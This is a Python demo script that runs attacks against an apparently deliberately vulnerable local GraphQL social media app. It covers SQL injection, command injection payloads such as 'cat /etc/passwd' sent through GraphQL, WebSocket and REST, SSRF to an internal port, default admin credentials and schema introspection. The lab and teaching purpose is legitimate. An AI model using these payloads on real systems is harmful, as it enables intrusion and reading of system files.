#!/usr/bin/env python3
"""
Vulnerability Demo Script
This script demonstrates various security vulnerabilities in the Social Media GraphQL API
WARNING: This is for educational purposes only. Do not use on production systems.
"""

import requests
import json
import websocket
import time

BASE_URL = "http://localhost:5013"

def print_section(title):
    print(f"\n{'='*50}")
    print(f" {title}")
    print(f"{'='*50}")

def demo_sql_injection():
    print_section("SQL Injection Vulnerability")
    
    # Vulnerable query - SQL injection in user_by_id
    malicious_query = """
    query {
      userById(id: "1 UNION SELECT 1,2,3,4,5") {
        id
        username
        email
        role
      }
    }
    """
    
    print("Attempting SQL injection...")
    response = requests.post(f"{BASE_URL}/graphql", 
                           json={"query": malicious_query})
    
    if response.status_code == 200:
        print("✓ SQL injection vulnerability confirmed")
        print(f"Response: {response.text}")
    else:
        print("✗ SQL injection attempt failed")

def demo_command_injection():
    print_section("Command Injection Vulnerability")
    
    # Vulnerable mutation - command injection
    malicious_mutation = """
    mutation {
      systemCommand(command: "ls -la; cat /etc/passwd") {
        result
      }
    }
    """
    
    print("Attempting command injection...")
    response = requests.post(f"{BASE_URL}/graphql", 
                           json={"query": malicious_mutation})
    
    if response.status_code == 200:
        print("✓ Command injection vulnerability confirmed")
        result = response.json()
        print(f"Command output: {result.get('data', {}).get('systemCommand', {}).get('result', 'No output')}")
    else:
        print("✗ Command injection attempt failed")

def demo_ssrf():
    print_section("Server-Side Request Forgery (SSRF)")
    
    # Vulnerable mutation - SSRF
    malicious_mutation = """
    mutation {
      fetchUrl(url: "http://localhost:22") {
        response
      }
    }
    """
    
    print("Attempting SSRF...")
    response = requests.post(f"{BASE_URL}/graphql", 
                           json={"query": malicious_mutation})
    
    if response.status_code == 200:
        print("✓ SSRF vulnerability confirmed")
        result = response.json()
        print(f"SSRF response: {result.get('data', {}).get('fetchUrl', {}).get('response', 'No response')}")
    else:
        print("✗ SSRF attempt failed")

def demo_unauthorized_access():
    print_section("Unauthorized Access")
    
    # Access admin dashboard without authentication
    print("Attempting to access admin dashboard...")
    response = requests.get(f"{BASE_URL}/dashboard")
    
    if response.status_code == 200:
        print("✓ Unauthorized access vulnerability confirmed")
        print("Admin dashboard accessible without authentication")
    else:
        print("✗ Unauthorized access attempt failed")

def demo_weak_authentication():
    print_section("Weak Authentication")
    
    # Try to login with weak credentials
    login_data = {
        "username": "admin",
        "password": "admin123"
    }
    
    print("Attempting login with weak credentials...")
    response = requests.post(f"{BASE_URL}/login", data=login_data)
    
    if response.status_code == 200:
        print("✓ Weak authentication vulnerability confirmed")
        print("Login successful with weak credentials")
    else:
        print("✗ Weak authentication attempt failed")

def demo_websocket_vulnerabilities():
    print_section("WebSocket Vulnerabilities")
    
    try:
        # Connect to WebSocket
        ws = websocket.create_connection(f"ws://localhost:5013/ws")
        
        # Send malicious command via WebSocket
        malicious_command = {
            "type": "system",
            "command": "whoami; pwd"
        }
        
        print("Sending malicious command via WebSocket...")
        ws.send(json.dumps(malicious_command))
        
        # Receive response
        response = ws.recv()
        result = json.loads(response)
        
        if "result" in result:
            print("✓ WebSocket command injection vulnerability confirmed")
            print(f"Command output: {result['result']}")
        else:
            print("✗ WebSocket command injection attempt failed")
        
        ws.close()
        
    except Exception as e:
        print(f"✗ WebSocket connection failed: {e}")

def demo_information_disclosure():
    print_section("Information Disclosure")
    
    # Try to access GraphQL introspection
    introspection_query = """
    query IntrospectionQuery {
      __schema {
        queryType {
          name
        }
        mutationType {
          name
        }
        subscriptionType {
          name
        }
        types {
          ...FullType
        }
        directives {
          name
          description
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
    """
    
    print("Attempting GraphQL introspection...")
    response = requests.post(f"{BASE_URL}/graphql", 
                           json={"query": introspection_query})
    
    if response.status_code == 200:
        result = response.json()
        if "data" in result and result["data"]:
            print("✓ GraphQL introspection vulnerability confirmed")
            print("Full schema information is exposed")
        else:
            print("✗ GraphQL introspection attempt failed")
    else:
        print("✗ GraphQL introspection attempt failed")

def demo_rest_api_vulnerabilities():
    print_section("REST API Vulnerabilities")
    
    # Test system command endpoint
    print("Testing system command endpoint...")
    response = requests.post(f"{BASE_URL}/api/system", 
                           json={"command": "id"})
    
    if response.status_code == 200:
        result = response.json()
        print("✓ REST API command injection vulnerability confirmed")
        print(f"Command output: {result.get('result', 'No output')}")
    else:
        print("✗ REST API command injection attempt failed")
    
    # Test SSRF endpoint
    print("Testing SSRF endpoint...")
    response = requests.post(f"{BASE_URL}/api/fetch", 
                           json={"url": "http://localhost:22"})
    
    if response.status_code == 200:
        result = response.json()
        print("✓ REST API SSRF vulnerability confirmed")
        print(f"SSRF response: {result.get('response', 'No response')}")
    else:
        print("✗ REST API SSRF attempt failed")

def main():
    print("Social Media GraphQL API - Vulnerability Demo")
    print("WARNING: This script demonstrates security vulnerabilities.")
    print("Only use on systems you own or have permission to test.")
    
    try:
        # Test if the application is running
        response = requests.get(f"{BASE_URL}/")
        if response.status_code != 200:
            print(f"Error: Application not running at {BASE_URL}")
            print("Please start the application first: python app.py")
            return
        
        print("✓ Application is running")
        
        # Run vulnerability demos
        demo_sql_injection()
        demo_command_injection()
        demo_ssrf()
        demo_unauthorized_access()
        demo_weak_authentication()
        demo_websocket_vulnerabilities()
        demo_information_disclosure()
        demo_rest_api_vulnerabilities()
        
        print_section("Demo Complete")
        print("All vulnerability tests completed.")
        print("Remember: This is for educational purposes only!")
        
    except requests.exceptions.ConnectionError:
        print(f"Error: Cannot connect to {BASE_URL}")
        print("Please make sure the application is running: python app.py")
    except Exception as e:
        print(f"Error during demo: {e}")

if __name__ == "__main__":
    main() 